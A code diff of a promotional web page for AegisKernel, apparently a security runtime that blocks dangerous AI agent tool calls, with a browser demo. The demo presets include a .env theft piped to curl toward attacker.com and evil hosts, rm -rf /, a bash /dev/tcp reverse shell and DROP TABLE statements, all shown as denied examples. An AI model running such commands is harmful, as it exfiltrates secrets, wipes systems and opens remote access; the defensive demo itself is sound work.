@@ -34,7 +34,7 @@
 </head>
 <body class="text-slate-100 min-h-screen flex flex-col justify-between selection:bg-emerald-500 selection:text-black">
 
-  <!-- TOP BAR -->
+  <!-- TOP NAVIGATION -->
   <header class="border-b border-slate-800 bg-slate-950/90 backdrop-blur sticky top-0 z-50 px-6 py-3.5">
     <div class="max-w-6xl mx-auto flex items-center justify-between">
       <div class="flex items-center space-x-3">
@@ -47,14 +47,14 @@
             <span class="text-[11px] px-2 py-0.5 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 mono font-semibold">v0.6.0</span>
             <span class="text-[11px] px-2 py-0.5 rounded-full bg-slate-800 text-slate-400 border border-slate-700 mono hidden sm:inline">open source</span>
           </div>
-          <p class="text-[11px] text-slate-400">Deterministic Capability-Based Security Runtime for AI Agents</p>
+          <p class="text-[11px] text-slate-400">Zero-Trust Deterministic Security Runtime for AI Agents</p>
         </div>
       </div>
       <div class="flex items-center space-x-2.5">
-        <div class="hidden md:flex items-center space-x-2 text-xs mono text-emerald-400 bg-emerald-950/30 border border-emerald-800/40 px-3 py-1.5 rounded-lg">
-          <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
-          <span>INTERCEPTION &lt; 0.016ms</span>
-        </div>
+        <a href="#sandbox" class="text-xs text-slate-300 hover:text-white px-3 py-1.5 rounded-lg border border-slate-800 hover:border-slate-700 font-medium transition hidden md:inline-flex items-center space-x-1.5">
+          <i class="fa-solid fa-terminal text-emerald-400"></i>
+          <span>Live Sandbox</span>
+        </a>
         <a href="https://pypi.org/project/aegis-kernel/" target="_blank" class="text-xs bg-slate-800 hover:bg-slate-700 text-slate-200 px-3 py-1.5 rounded-lg border border-slate-700 font-semibold transition flex items-center space-x-1.5">
           <i class="fa-brands fa-python text-amber-400 text-sm"></i>
           <span>PyPI v0.6</span>
@@ -67,191 +67,284 @@
     </div>
   </header>
 
-  <!-- MAIN CONTAINER -->
-  <main class="max-w-6xl mx-auto px-6 py-8 w-full flex-grow">
+  <!-- MAIN CONTENT CONTAINER -->
+  <main class="max-w-6xl mx-auto px-6 py-10 w-full flex-grow space-y-12">
     
-    <!-- HEADER INTRO -->
-    <div class="text-center max-w-3xl mx-auto mb-8">
-      <h2 class="text-2xl sm:text-3xl font-extrabold text-white tracking-tight mb-2">
-        Live Capability Policy Interceptor
-      </h2>
-      <p class="text-slate-400 text-xs sm:text-sm">
-        Secondary LLM filters add 800ms latency and fail against indirect injection. AegisKernel enforces strict deterministic capability scopes (<span class="mono text-emerald-400">&lt;0.016ms</span>) before tools execute.
-      </p>
-      <div class="mt-3 inline-flex items-center space-x-2 text-[11px] mono text-slate-400 bg-slate-900 border border-slate-800 px-3 py-1 rounded-full">
-        <span class="text-emerald-400">●</span>
-        <span>Test both safe commands (ls, cat, echo) and hostile exploits (.env theft, rm, curl egress)</span>
+    <!-- HERO SECTION (WHAT IS AEGISKERNEL & WHY IT MATTERS) -->
+    <section class="text-center max-w-4xl mx-auto pt-4">
+      <div class="inline-flex items-center space-x-2 px-3 py-1 rounded-full bg-emerald-950/40 border border-emerald-500/30 text-emerald-400 text-xs mono font-semibold mb-5">
+        <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
+        <span>Deterministic Process Interception &bull; &lt; 0.016ms Latency &bull; MIT Licensed</span>
       </div>
-    </div>
 
-    <!-- PLAYGROUND GRID -->
-    <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
+      <h2 class="text-3xl sm:text-5xl font-extrabold text-white tracking-tight leading-tight sm:leading-tight mb-5">
+        Stop Rogue AI Agent Tool Execution <br class="hidden sm:block" />
+        <span class="bg-gradient-to-r from-emerald-400 via-cyan-400 to-blue-500 bg-clip-text text-transparent">
+          Before It Touches the OS
+        </span>
+      </h2>
 
-      <!-- LEFT: ATTACK / COMMAND CONTROL (5 COLS) -->
-      <div class="lg:col-span-5 bg-slate-900/60 border border-slate-800 rounded-2xl p-5 flex flex-col justify-between">
-        <div>
-          <div class="flex items-center justify-between mb-3">
-            <span class="text-xs mono font-bold text-slate-300 uppercase tracking-wider">Test Commands & Scenarios</span>
-            <span class="text-[11px] text-slate-400 mono">Preset Scenarios</span>
-          </div>
+      <p class="text-slate-300 text-sm sm:text-base leading-relaxed max-w-2xl mx-auto mb-8">
+        When you give an AI agent access to bash, python, or file tools, a prompt injection can read your <code class="mono text-emerald-300 bg-slate-900 px-1.5 py-0.5 rounded border border-slate-800">.env</code> keys or wipe disk. 
+        AegisKernel wraps agent tools in deterministic capability tokens, dropping unauthorized syscalls in microsecond speed with <strong>zero LLM latency and zero token cost</strong>.
+      </p>
 
-          <!-- PRESETS -->
-          <div class="space-y-2 mb-4">
-            <!-- SAFE 1 -->
-            <button onclick="selectCommand(0)" class="cmd-preset w-full text-left p-2.5 rounded-xl bg-slate-800/40 hover:bg-slate-800/80 border border-slate-700/60 transition group flex items-start space-x-3">
-              <span class="text-emerald-400 text-xs mt-0.5"><i class="fa-solid fa-circle-check"></i></span>
-              <div class="flex-1 min-w-0">
-                <div class="text-xs font-semibold text-white group-hover:text-emerald-300 flex items-center justify-between">
-                  <span>Safe File Read (Allowed)</span>
-                  <span class="text-[10px] text-emerald-400 mono">ALLOW</span>
-                </div>
-                <div class="text-[11px] mono text-slate-400 truncate">cat ./data/report.json</div>
-              </div>
-            </button>
-
-            <!-- SAFE 2 -->
-            <button onclick="selectCommand(1)" class="cmd-preset w-full text-left p-2.5 rounded-xl bg-slate-800/40 hover:bg-slate-800/80 border border-slate-700/60 transition group flex items-start space-x-3">
-              <span class="text-emerald-400 text-xs mt-0.5"><i class="fa-solid fa-circle-check"></i></span>
-              <div class="flex-1 min-w-0">
-                <div class="text-xs font-semibold text-white group-hover:text-emerald-300 flex items-center justify-between">
-                  <span>List Directory (Allowed)</span>
-                  <span class="text-[10px] text-emerald-400 mono">ALLOW</span>
-                </div>
-                <div class="text-[11px] mono text-slate-400 truncate">ls -la ./workspace</div>
-              </div>
-            </button>
-
-            <!-- ATTACK 1 -->
-            <button onclick="selectCommand(2)" class="cmd-preset w-full text-left p-2.5 rounded-xl bg-slate-800/40 hover:bg-slate-800/80 border border-rose-900/30 transition group flex items-start space-x-3">
-              <span class="text-rose-400 text-xs mt-0.5"><i class="fa-solid fa-triangle-exclamation"></i></span>
-              <div class="flex-1 min-w-0">
-                <div class="text-xs font-semibold text-white group-hover:text-rose-300 flex items-center justify-between">
-                  <span>Path Traversal (.env Theft)</span>
-                  <span class="text-[10px] text-rose-400 mono">DENIED</span>
-                </div>
-                <div class="text-[11px] mono text-slate-400 truncate">cat ../../.env && curl attacker.com</div>
-              </div>
-            </button>
-
-            <!-- ATTACK 2 -->
-            <button onclick="selectCommand(3)" class="cmd-preset w-full text-left p-2.5 rounded-xl bg-slate-800/40 hover:bg-slate-800/80 border border-rose-900/30 transition group flex items-start space-x-3">
-              <span class="text-rose-400 text-xs mt-0.5"><i class="fa-solid fa-triangle-exclamation"></i></span>
-              <div class="flex-1 min-w-0">
-                <div class="text-xs font-semibold text-white group-hover:text-rose-300 flex items-center justify-between">
-                  <span>Destructive Command</span>
-                  <span class="text-[10px] text-rose-400 mono">DENIED</span>
-                </div>
-                <div class="text-[11px] mono text-slate-400 truncate">rm -rf / --no-preserve-root</div>
-              </div>
-            </button>
-
-            <!-- ATTACK 3 -->
-            <button onclick="selectCommand(4)" class="cmd-preset w-full text-left p-2.5 rounded-xl bg-slate-800/40 hover:bg-slate-800/80 border border-rose-900/30 transition group flex items-start space-x-3">
-              <span class="text-rose-400 text-xs mt-0.5"><i class="fa-solid fa-triangle-exclamation"></i></span>
-              <div class="flex-1 min-w-0">
-                <div class="text-xs font-semibold text-white group-hover:text-rose-300 flex items-center justify-between">
-                  <span>Reverse Shell Spawn</span>
-                  <span class="text-[10px] text-rose-400 mono">DENIED</span>
-                </div>
-                <div class="text-[11px] mono text-slate-400 truncate">bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1</div>
-              </div>
-            </button>
-          </div>
-
-          <!-- CUSTOM INPUT -->
-          <div class="mb-4">
-            <div class="flex items-center justify-between mb-1.5">
-              <label class="text-xs font-semibold text-slate-300 mono">Command to evaluate:</label>
-              <span class="text-[10px] text-slate-500 mono">Custom editable</span>
-            </div>
-            <textarea id="cmdInput" rows="3" class="w-full bg-slate-950 border border-slate-700/80 rounded-xl p-3 text-xs mono text-emerald-400 focus:outline-none focus:border-emerald-500 custom-scrollbar resize-none"></textarea>
-          </div>
-        </div>
-
-        <!-- EXECUTE CONTROLS -->
-        <div>
-          <div class="flex items-center justify-between mb-3 bg-slate-950/80 p-2.5 rounded-xl border border-slate-800">
-            <div>
-              <div class="text-xs font-medium text-slate-200">Aegis Capability Enforcement:</div>
-              <div class="text-[10px] text-slate-400">Strict process-tree policy boundary</div>
-            </div>
-            <label class="relative inline-flex items-center cursor-pointer">
-              <input type="checkbox" id="aegisToggle" checked class="sr-only peer">
-              <div class="w-11 h-6 bg-slate-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-slate-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-emerald-500"></div>
-            </label>
-          </div>
-
-          <button onclick="evaluateCommand()" class="w-full py-3 rounded-xl bg-gradient-to-r from-emerald-500 to-cyan-500 hover:from-emerald-400 hover:to-cyan-400 text-slate-950 font-bold text-xs tracking-wider uppercase shadow-lg shadow-emerald-500/20 transition flex items-center justify-center space-x-2">
-            <i class="fa-solid fa-play text-xs"></i>
-            <span>Evaluate Against Policy Engine</span>
+      <!-- INSTALL & CTA BUTTONS -->
+      <div class="flex flex-col sm:flex-row items-center justify-center gap-3.5 mb-10">
+        <div class="flex items-center bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 mono text-xs text-slate-300 shadow-inner group">
+          <span class="text-emerald-400 mr-2">$</span>
+          <span id="pipCmd">pip install aegis-kernel</span>
+          <button onclick="copyPip()" class="ml-3 text-slate-500 hover:text-white transition" title="Copy pip command">
+            <i class="fa-regular fa-copy" id="copyIcon"></i>
           </button>
         </div>
+        <a href="#sandbox" class="w-full sm:w-auto px-5 py-2.5 rounded-xl bg-gradient-to-r from-emerald-500 to-cyan-500 hover:from-emerald-400 hover:to-cyan-400 text-slate-950 font-bold text-xs tracking-wider uppercase transition shadow-lg shadow-emerald-500/20 flex items-center justify-center space-x-2">
+          <i class="fa-solid fa-play text-xs"></i>
+          <span>Try Live Sandbox Below</span>
+        </a>
+        <a href="https://github.com/adikshatriyag-crypto/aegis-kernel" target="_blank" class="w-full sm:w-auto px-4 py-2.5 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-800 text-slate-200 text-xs font-semibold transition flex items-center justify-center space-x-2">
+          <i class="fa-brands fa-github"></i>
+          <span>Star on GitHub</span>
+        </a>
       </div>
 
-      <!-- RIGHT: SIMULATED HUD & FORENSIC LOG (7 COLS) -->
-      <div class="lg:col-span-7 bg-slate-900/60 border border-slate-800 rounded-2xl p-5 flex flex-col justify-between">
+      <!-- 3 PILLARS / PROBLEM STATEMENT -->
+      <div class="grid grid-cols-1 md:grid-cols-3 gap-4 text-left pt-2">
+        <div class="bg-slate-900/40 border border-slate-800/80 rounded-2xl p-5 hover:border-slate-700 transition">
+          <div class="w-8 h-8 rounded-lg bg-rose-500/10 text-rose-400 flex items-center justify-center text-sm mb-3">
+            <i class="fa-solid fa-shield-xmark"></i>
+          </div>
+          <h3 class="text-sm font-bold text-white mb-1.5">LLM Guardrails Fail</h3>
+          <p class="text-xs text-slate-400 leading-relaxed">
+            Secondary LLMs add ~800ms latency and hallucinate against Base64 encoding, path traversal, or multi-turn injection payloads.
+          </p>
+        </div>
+
+        <div class="bg-slate-900/40 border border-slate-800/80 rounded-2xl p-5 hover:border-slate-700 transition">
+          <div class="w-8 h-8 rounded-lg bg-emerald-500/10 text-emerald-400 flex items-center justify-center text-sm mb-3">
+            <i class="fa-solid fa-bolt"></i>
+          </div>
+          <h3 class="text-sm font-bold text-white mb-1.5">Hardware Speed (&lt;0.016ms)</h3>
+          <p class="text-xs text-slate-400 leading-relaxed">
+            Deterministic capability validation executes in sub-millisecond hardware time with 0 tokens spent, preserving interactive agent UX.
+          </p>
+        </div>
+
+        <div class="bg-slate-900/40 border border-slate-800/80 rounded-2xl p-5 hover:border-slate-700 transition">
+          <div class="w-8 h-8 rounded-lg bg-cyan-500/10 text-cyan-400 flex items-center justify-center text-sm mb-3">
+            <i class="fa-solid fa-lock"></i>
+          </div>
+          <h3 class="text-sm font-bold text-white mb-1.5">Process Boundary Defense</h3>
+          <p class="text-xs text-slate-400 leading-relaxed">
+            Enforces strict least-privilege tokens at process invocation before <code class="mono text-cyan-300">execve</code> or <code class="mono text-cyan-300">openat</code> reach the OS.
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <!-- CODE SNIPPET (HOW TO USE IN 3 LINES) -->
+    <section class="bg-slate-900/60 border border-slate-800 rounded-2xl p-6">
+      <div class="flex flex-col sm:flex-row sm:items-center justify-between mb-4 gap-2">
         <div>
-          <div class="flex items-center justify-between mb-3">
-            <span class="text-xs mono font-bold text-slate-300 uppercase tracking-wider">Policy Enforcement Telemetry</span>
-            <div id="statusBadge" class="text-xs px-2.5 py-1 rounded-full bg-slate-800 text-slate-400 mono font-semibold">
-              STANDBY
+          <h3 class="text-sm font-bold text-white flex items-center space-x-2">
+            <i class="fa-solid fa-code text-emerald-400"></i>
+            <span>3-Line Python Integration (LangChain, CrewAI, AutoGen, or Raw Tools)</span>
+          </h3>
+          <p class="text-xs text-slate-400 mt-0.5">Wrap any tool function with the zero-trust AegisShield decorator.</p>
+        </div>
+        <span class="text-[11px] mono text-emerald-400 bg-emerald-950/40 border border-emerald-800/40 px-2.5 py-1 rounded-md self-start sm:self-auto">
+          Drop-in Compatibility
+        </span>
+      </div>
+      
+      <div class="bg-slate-950 p-4 rounded-xl border border-slate-800/90 mono text-xs text-slate-300 leading-relaxed overflow-x-auto custom-scrollbar">
+<span class="text-slate-500"># 1. Install via pip: pip install aegis-kernel</span>
+<span class="text-purple-400">from</span> aegis <span class="text-purple-400">import</span> AegisShield, SecurityPolicy
+
+<span class="text-slate-500"># 2. Grant scoped workspace capability token (Least Privilege)</span>
+shield = AegisShield(policy=SecurityPolicy.strict(allowed_paths=[<span class="text-emerald-300">"./data"</span>, <span class="text-emerald-300">"./workspace"</span>]))
+
+<span class="text-slate-500"># 3. Protect tool: unauthorized syscalls (.env theft, rm -rf, reverse shells) are killed instantly</span>
+<span class="text-purple-400">@shield.protect_tool</span>
+<span class="text-blue-400">def</span> <span class="text-yellow-300">execute_agent_tool</span>(command: str):
+    <span class="text-purple-400">return</span> subprocess.run(command, shell=<span class="text-amber-400">True</span>, capture_output=<span class="text-amber-400">True</span>)
+      </div>
+    </section>
+
+    <!-- INTERACTIVE LIVE SANDBOX SECTION -->
+    <section id="sandbox" class="pt-4">
+      <div class="text-center max-w-2xl mx-auto mb-8">
+        <span class="text-[11px] mono font-bold text-emerald-400 uppercase tracking-widest bg-emerald-950/40 border border-emerald-800/40 px-3 py-1 rounded-full">
+          Interactive Browser Terminal
+        </span>
+        <h2 class="text-2xl sm:text-3xl font-extrabold text-white tracking-tight mt-3 mb-2">
+          Live Capability Policy Interceptor
+        </h2>
+        <p class="text-slate-400 text-xs sm:text-sm">
+          Test real agent prompts and attack vectors live in the client-side deterministic AST evaluator below.
+        </p>
+      </div>
+
+      <!-- PLAYGROUND GRID -->
+      <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
+
+        <!-- LEFT: ATTACK / COMMAND CONTROL (5 COLS) -->
+        <div class="lg:col-span-5 bg-slate-900/60 border border-slate-800 rounded-2xl p-5 flex flex-col justify-between">
+          <div>
+            <div class="flex items-center justify-between mb-3">
+              <span class="text-xs mono font-bold text-slate-300 uppercase tracking-wider">Test Commands & Scenarios</span>
+              <span class="text-[11px] text-slate-400 mono">Preset Scenarios</span>
+            </div>
+
+            <!-- PRESETS -->
+            <div class="space-y-2 mb-4">
+              <!-- SAFE 1 -->
+              <button onclick="selectCommand(0)" class="cmd-preset w-full text-left p-2.5 rounded-xl bg-slate-800/40 hover:bg-slate-800/80 border border-slate-700/60 transition group flex items-start space-x-3">
+                <span class="text-emerald-400 text-xs mt-0.5"><i class="fa-solid fa-circle-check"></i></span>
+                <div class="flex-1 min-w-0">
+                  <div class="text-xs font-semibold text-white group-hover:text-emerald-300 flex items-center justify-between">
+                    <span>Safe File Read (Allowed)</span>
+                    <span class="text-[10px] text-emerald-400 mono">ALLOW</span>
+                  </div>
+                  <div class="text-[11px] mono text-slate-400 truncate">cat ./data/report.json</div>
+                </div>
+              </button>
+
+              <!-- SAFE 2 -->
+              <button onclick="selectCommand(1)" class="cmd-preset w-full text-left p-2.5 rounded-xl bg-slate-800/40 hover:bg-slate-800/80 border border-slate-700/60 transition group flex items-start space-x-3">
+                <span class="text-emerald-400 text-xs mt-0.5"><i class="fa-solid fa-circle-check"></i></span>
+                <div class="flex-1 min-w-0">
+                  <div class="text-xs font-semibold text-white group-hover:text-emerald-300 flex items-center justify-between">
+                    <span>List Directory (Allowed)</span>
+                    <span class="text-[10px] text-emerald-400 mono">ALLOW</span>
+                  </div>
+                  <div class="text-[11px] mono text-slate-400 truncate">ls -la ./workspace</div>
+                </div>
+              </button>
+
+              <!-- ATTACK 1 -->
+              <button onclick="selectCommand(2)" class="cmd-preset w-full text-left p-2.5 rounded-xl bg-slate-800/40 hover:bg-slate-800/80 border border-rose-900/30 transition group flex items-start space-x-3">
+                <span class="text-rose-400 text-xs mt-0.5"><i class="fa-solid fa-triangle-exclamation"></i></span>
+                <div class="flex-1 min-w-0">
+                  <div class="text-xs font-semibold text-white group-hover:text-rose-300 flex items-center justify-between">
+                    <span>Path Traversal (.env Theft)</span>
+                    <span class="text-[10px] text-rose-400 mono">DENIED</span>
+                  </div>
+                  <div class="text-[11px] mono text-slate-400 truncate">cat ../../.env && curl -X POST https://evil...</div>
+                </div>
+              </button>
+
+              <!-- ATTACK 2 -->
+              <button onclick="selectCommand(3)" class="cmd-preset w-full text-left p-2.5 rounded-xl bg-slate-800/40 hover:bg-slate-800/80 border border-rose-900/30 transition group flex items-start space-x-3">
+                <span class="text-rose-400 text-xs mt-0.5"><i class="fa-solid fa-skull text-xs"></i></span>
+                <div class="flex-1 min-w-0">
+                  <div class="text-xs font-semibold text-white group-hover:text-rose-300 flex items-center justify-between">
+                    <span>Destructive Host Denial (rm -rf)</span>
+                    <span class="text-[10px] text-rose-400 mono">DENIED</span>
+                  </div>
+                  <div class="text-[11px] mono text-slate-400 truncate">rm -rf / --no-preserve-root; echo 'PWNED'</div>
+                </div>
+              </button>
+
+              <!-- ATTACK 3 -->
+              <button onclick="selectCommand(4)" class="cmd-preset w-full text-left p-2.5 rounded-xl bg-slate-800/40 hover:bg-slate-800/80 border border-rose-900/30 transition group flex items-start space-x-3">
+                <span class="text-rose-400 text-xs mt-0.5"><i class="fa-solid fa-network-wired text-xs"></i></span>
+                <div class="flex-1 min-w-0">
+                  <div class="text-xs font-semibold text-white group-hover:text-rose-300 flex items-center justify-between">
+                    <span>Outbound Reverse Shell (bash -i)</span>
+                    <span class="text-[10px] text-rose-400 mono">DENIED</span>
+                  </div>
+                  <div class="text-[11px] mono text-slate-400 truncate">bash -i >& /dev/tcp/10.0.0.1/4444 0>&1</div>
+                </div>
+              </button>
+
+              <!-- ATTACK 4 -->
+              <button onclick="selectCommand(5)" class="cmd-preset w-full text-left p-2.5 rounded-xl bg-slate-800/40 hover:bg-slate-800/80 border border-rose-900/30 transition group flex items-start space-x-3">
+                <span class="text-rose-400 text-xs mt-0.5"><i class="fa-solid fa-database text-xs"></i></span>
+                <div class="flex-1 min-w-0">
+                  <div class="text-xs font-semibold text-white group-hover:text-rose-300 flex items-center justify-between">
+                    <span>SQL Injection (DROP TABLE)</span>
+                    <span class="text-[10px] text-rose-400 mono">DENIED</span>
+                  </div>
+                  <div class="text-[11px] mono text-slate-400 truncate">DROP TABLE customers; DROP TABLE transactions;</div>
+                </div>
+              </button>
+            </div>
+
+            <!-- CUSTOM COMMAND INPUT -->
+            <div class="mb-4">
+              <label class="block text-xs mono text-slate-400 mb-1.5">Or write arbitrary agent command / payload:</label>
+              <div class="relative">
+                <input type="text" id="cmdInput" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-xs text-white mono focus:outline-none focus:border-emerald-500/60 transition" />
+              </div>
             </div>
           </div>
 
-          <!-- TERMINAL DISPLAY -->
-          <div id="terminalHud" class="bg-slate-950 rounded-xl border border-slate-800/80 p-4 min-h-[300px] mono text-xs leading-relaxed scan-line overflow-y-auto custom-scrollbar">
-            <div class="text-slate-500">// AegisKernel Deterministic Policy Engine initialized.</div>
-            <div class="text-slate-500">// Task Context: ScopedWorker (Root: ./workspace)</div>
-            <div class="text-slate-500">// Allowed Syscalls: execve(/bin/ls, /bin/cat, /bin/echo, python3), openat(./data/*)</div>
-            <div class="text-slate-600 mt-3">Select a scenario or type a command on the left to evaluate capability boundary.</div>
+          <!-- EXECUTE CONTROLS -->
+          <div>
+            <div class="flex items-center justify-between mb-3 bg-slate-950/80 p-2.5 rounded-xl border border-slate-800">
+              <div>
+                <div class="text-xs font-medium text-slate-200">Aegis Capability Enforcement:</div>
+                <div class="text-[10px] text-slate-400">Strict process-tree policy boundary</div>
+              </div>
+              <label class="relative inline-flex items-center cursor-pointer">
+                <input type="checkbox" id="aegisToggle" checked class="sr-only peer">
+                <div class="w-11 h-6 bg-slate-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-slate-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-emerald-500"></div>
+              </label>
+            </div>
+
+            <button onclick="evaluateCommand()" class="w-full py-3 rounded-xl bg-gradient-to-r from-emerald-500 to-cyan-500 hover:from-emerald-400 hover:to-cyan-400 text-slate-950 font-bold text-xs tracking-wider uppercase shadow-lg shadow-emerald-500/20 transition flex items-center justify-center space-x-2">
+              <i class="fa-solid fa-play text-xs"></i>
+              <span>Evaluate Against Policy Engine</span>
+            </button>
           </div>
         </div>
 
-        <!-- TELEMETRY STATS -->
-        <div class="grid grid-cols-3 gap-3 mt-4 pt-3.5 border-t border-slate-800/80 text-center mono">
-          <div class="bg-slate-950/80 p-2.5 rounded-xl border border-slate-800/60">
-            <div class="text-[10px] text-slate-400">EVALUATION TIME</div>
-            <div id="metricLatency" class="text-xs font-bold text-emerald-400 mt-0.5">-- ms</div>
+        <!-- RIGHT: SIMULATED HUD & FORENSIC LOG (7 COLS) -->
+        <div class="lg:col-span-7 bg-slate-900/60 border border-slate-800 rounded-2xl p-5 flex flex-col justify-between">
+          <div>
+            <div class="flex items-center justify-between mb-3">
+              <span class="text-xs mono font-bold text-slate-300 uppercase tracking-wider">Policy Enforcement Telemetry</span>
+              <div id="statusBadge" class="text-xs px-2.5 py-1 rounded-full bg-slate-800 text-slate-400 mono font-semibold">
+                STANDBY
+              </div>
+            </div>
+
+            <!-- TERMINAL DISPLAY -->
+            <div id="terminalHud" class="bg-slate-950 rounded-xl border border-slate-800/80 p-4 min-h-[300px] mono text-xs leading-relaxed scan-line overflow-y-auto custom-scrollbar">
+              <div class="text-slate-500">// AegisKernel Deterministic Policy Engine initialized.</div>
+              <div class="text-slate-500">// Task Context: ScopedWorker (Root: ./workspace)</div>
+              <div class="text-slate-500">// Allowed Syscalls: execve(/bin/ls, /bin/cat, /bin/echo, python3), openat(./data/*)</div>
+              <div class="text-slate-600 mt-3">Select a scenario or type a command on the left to evaluate capability boundary.</div>
+            </div>
           </div>
-          <div class="bg-slate-950/80 p-2.5 rounded-xl border border-slate-800/60">
-            <div class="text-[10px] text-slate-400">POLICY VERDICT</div>
-            <div id="metricVerdict" class="text-xs font-bold text-slate-400 mt-0.5">IDLE</div>
-          </div>
-          <div class="bg-slate-950/80 p-2.5 rounded-xl border border-slate-800/60">
-            <div class="text-[10px] text-slate-400">AUDIT TOKEN HASH</div>
-            <div id="metricHash" class="text-xs font-bold text-cyan-400 mt-0.5">--</div>
+
+          <!-- TELEMETRY STATS -->
+          <div class="grid grid-cols-3 gap-3 mt-4 pt-3.5 border-t border-slate-800/80 text-center mono">
+            <div class="bg-slate-950/80 p-2.5 rounded-xl border border-slate-800/60">
+              <div class="text-[10px] text-slate-400">EVALUATION TIME</div>
+              <div id="metricLatency" class="text-xs font-bold text-emerald-400 mt-0.5">-- ms</div>
+            </div>
+            <div class="bg-slate-950/80 p-2.5 rounded-xl border border-slate-800/60">
+              <div class="text-[10px] text-slate-400">POLICY VERDICT</div>
+              <div id="metricVerdict" class="text-xs font-bold text-slate-400 mt-0.5">IDLE</div>
+            </div>
+            <div class="bg-slate-950/80 p-2.5 rounded-xl border border-slate-800/60">
+              <div class="text-[10px] text-slate-400">AUDIT TOKEN HASH</div>
+              <div id="metricHash" class="text-xs font-bold text-cyan-400 mt-0.5">--</div>
+            </div>
           </div>
         </div>
+
       </div>
-
-    </div>
-
-    <!-- CODE SNIPPET (HOW TO USE IN 2 LINES) -->
-    <div class="mt-8 bg-slate-900/40 border border-slate-800 rounded-2xl p-5">
-      <div class="flex items-center justify-between mb-3">
-        <h3 class="text-xs font-bold text-white flex items-center space-x-2">
-          <i class="fa-solid fa-code text-emerald-400"></i>
-          <span>Production Integration Snippet (PyPI: aegis-kernel)</span>
-        </h3>
-        <span class="text-[11px] mono text-slate-400">CrewAI / LangChain / Claude Code Ready</span>
-      </div>
-      <div class="bg-slate-950 p-4 rounded-xl border border-slate-800 mono text-xs text-slate-300 leading-relaxed overflow-x-auto">
-<span class="text-purple-400">from</span> aegis <span class="text-purple-400">import</span> AegisShield, SecurityPolicy
-
-<span class="text-slate-500"># Define capability context for autonomous agent tool execution</span>
-shield = AegisShield(policy=SecurityPolicy.strict(allowed_paths=[<span class="text-emerald-300">"./data"</span>, <span class="text-emerald-300">"./output"</span>]))
-
-<span class="text-purple-400">@shield.protect_tool</span>
-<span class="text-blue-400">def</span> <span class="text-yellow-300">execute_agent_tool</span>(command: str):
-    <span class="text-purple-400">return</span> os.system(command)  <span class="text-slate-500"># Drops unauthorized execve/openat in &lt;0.016ms before execution</span>
-      </div>
-    </div>
+    </section>
 
   </main>
 
   <!-- FOOTER -->
-  <footer class="border-t border-slate-800/80 bg-slate-950 px-6 py-4 text-center text-xs text-slate-500">
-    AegisKernel &copy; 2026 | Open-Source Autonomous Agent Security Runtime | Apache 2.0 / MIT
+  <footer class="border-t border-slate-800/80 bg-slate-950 px-6 py-6 text-center text-xs text-slate-500 space-y-2">
+    <div>AegisKernel &copy; 2026 &bull; Open-Source Autonomous Agent Security Runtime &bull; Apache 2.0 / MIT</div>
+    <div class="text-[11px] text-slate-600">Built by independent developers for the autonomous agent ecosystem. Free on PyPI & GitHub.</div>
   </footer>
 
   <!-- CLIENT-SIDE DETERMINISTIC POLICY EVALUATOR -->
@@ -269,6 +362,15 @@ shield = AegisShield(policy=SecurityPolicy.strict(allowed_paths=[<span class="te
       document.getElementById('cmdInput').value = presets[idx];
     }
     selectCommand(0);
+
+    function copyPip() {
+      navigator.clipboard.writeText("pip install aegis-kernel");
+      const icon = document.getElementById('copyIcon');
+      icon.className = "fa-solid fa-check text-emerald-400";
+      setTimeout(() => {
+        icon.className = "fa-regular fa-copy";
+      }, 2000);
+    }
 
     // Deterministic client-side Capability Policy Evaluator
     function evaluatePolicy(cmd) {
